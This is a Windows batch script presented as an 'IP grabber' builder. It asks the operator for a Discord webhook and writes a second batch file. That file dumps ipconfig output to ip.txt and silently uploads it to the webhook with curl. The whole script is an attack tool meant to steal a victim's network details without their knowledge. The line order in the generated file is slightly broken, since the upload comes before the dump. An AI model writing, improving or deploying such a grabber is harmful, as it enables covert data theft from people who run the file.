@echo off
chcp 65001
title TCG CONS - Ip Grabber - By TCGMonk
color 4

:menu
echo     ███      ▄████████    ▄██████▄        ▄████████  ▄██████▄  ███▄▄▄▄      ▄████████ 
echo ▀█████████▄ ███    ███   ███    ███      ███    ███ ███    ███ ███▀▀▀██▄   ███    ███ 
echo    ▀███▀▀██ ███    █▀    ███    █▀       ███    █▀  ███    ███ ███   ███   ███    █▀  
echo     ███   ▀ ███         ▄███             ███        ███    ███ ███   ███   ███        
echo     ███     ███        ▀▀███ ████▄       ███        ███    ███ ███   ███ ▀███████████ 
echo     ███     ███    █▄    ███    ███      ███    █▄  ███    ███ ███   ███          ███ 
echo     ███     ███    ███   ███    ███      ███    ███ ███    ███ ███   ███    ▄█    ███ 
echo    ▄████▀   ████████▀    ████████▀       ████████▀   ▀██████▀   ▀█   █▀   ▄████████▀  

set /p choice=Press enter to go to info grabber page . . . 

if "%choice%"=="1" goto Grabber

:Grabber
cls
echo  ▄█  ███▄▄▄▄      ▄████████  ▄██████▄          ▄██████▄     ▄████████    ▄████████ ▀█████████▄  ▀█████████▄     ▄████████    ▄████████ 
echo ███  ███▀▀▀██▄   ███    ███ ███    ███        ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ 
echo ███▌ ███   ███   ███    █▀  ███    ███        ███    █▀    ███    ███   ███    ███   ███    ███   ███    ███   ███    █▀    ███    ███ 
echo ███▌ ███   ███  ▄███▄▄▄     ███    ███       ▄███         ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄██▀   ▄███▄▄▄██▀   ▄███▄▄▄      ▄███▄▄▄▄██▀ 
echo ███▌ ███   ███ ▀▀███▀▀▀     ███    ███      ▀▀███ ████▄  ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀██▄  ▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
echo ███  ███   ███   ███        ███    ███        ███    ███ ▀███████████   ███    ███   ███    ██▄   ███    ██▄   ███    █▄  ▀███████████ 
echo ███  ███   ███   ███        ███    ███        ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ 
echo █▀    ▀█   █▀    ███         ▀██████▀         ████████▀    ███    ███   ███    █▀  ▄█████████▀  ▄█████████▀    ██████████   ███    ███ 
echo                                                            ███    ███                                                       ███    ███ 
set /p "webhook=Enter your Discord webhook here: "

if "%webhook%"=="" (
    echo discord webhook URL is required
    pause
    goto menu
)

echo Connection (True) Making ip logger script/
timeout /t 5 >null

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F 1=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo Ip grabber script has been created as ip_grabber_exec.bat.
pause
goto menu


